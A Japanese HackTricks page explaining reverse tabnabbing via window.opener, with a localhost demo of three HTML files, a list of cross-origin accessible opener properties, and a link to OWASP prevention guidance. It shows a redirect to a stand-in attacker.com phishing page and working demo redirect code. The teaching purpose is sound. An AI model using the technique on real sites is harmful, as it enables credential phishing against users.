<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する
- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>


# 説明

**攻撃者**が**`target="_blank" rel="opener"`**属性を持つ**`<a`**タグの**`href`**引数を**制御**できる状況で、被害者がクリックするリンクを**攻撃者**が自身のコントロール下にあるWebページ（**悪意のある** **ウェブサイト**）に向けることができます。その後、被害者がリンクをクリックして攻撃者のウェブサイトにアクセスすると、この**悪意のある** **ウェブサイト**はjavascriptオブジェクト**`window.opener`**を介して**元のページ**を**制御**できるようになります。\
ページに**`rel="opener"`**がないが`target="_blank"`を含んでおり、**`rel="noopener"`**がない場合も脆弱性がある可能性があります。

この動作を悪用する通常の方法は、`window.opener.location = https://attacker.com/victim.html`を介して元のWebの場所を変更し、**元のWebサイト**の**ログインフォーム**を**模倣**してユーザーに資格情報を要求できるようにすることです。

ただし、**攻撃者が今や元のウェブサイトのウィンドウオブジェクトを制御できる**ようになったため、他の方法で**ステルス攻撃**を実行するために悪用することができます（おそらくjavascriptイベントを変更して情報を彼が制御するサーバーに外部流出させるなど）。

# 概要

## バックリンクを使用した場合

予防属性が使用されていない場合の親ページと子ページ間のリンク：

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## バックリンクを使用しない場合

予防属性が使用されている場合の親ページと子ページ間のリンク：

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## 例 <a href="#examples" id="examples"></a>

次のページをフォルダに作成し、`python3 -m http.server`でWebサーバーを実行します。\
その後、`http://127.0.0.1:8000/`vulnerable.htmlにアクセスし、リンクをクリックして**元のウェブサイトのURLが変わる**様子を確認してください。

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## アクセス可能なプロパティ <a href="#accessible-properties" id="accessible-properties"></a>

異なるドメイン間でアクセスが発生するシナリオでは、**cross-origin** アクセスが発生し、悪意のあるサイトによってアクセスできる **opener** JavaScript オブジェクト参照によって参照される **window** JavaScript クラスインスタンスのプロパティは、以下に制限されます:

- **`opener.closed`**: このプロパティは、ウィンドウが閉じられたかどうかを判断するためにアクセスされ、ブール値を返します。
- **`opener.frames`**: このプロパティは、現在のウィンドウ内のすべての iframe 要素にアクセスを提供します。
- **`opener.length`**: 現在のウィンドウに存在する iframe 要素の数がこのプロパティによって返されます。
- **`opener.opener`**: 現在のウィンドウを開いたウィンドウへの参照をこのプロパティを通じて取得できます。
- **`opener.parent`**: このプロパティは、現在のウィンドウの親ウィンドウを返します。
- **`opener.self`**: このプロパティによって現在のウィンドウ自体にアクセスできます。
- **`opener.top`**: このプロパティは、最上位のブラウザウィンドウを返します。

ただし、ドメインが同一の場合、悪意のあるサイトは [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScript オブジェクト参照によって公開されるすべてのプロパティにアクセスできます。

# 予防策

予防情報は [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing) に文書化されています。

# 参考文献

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
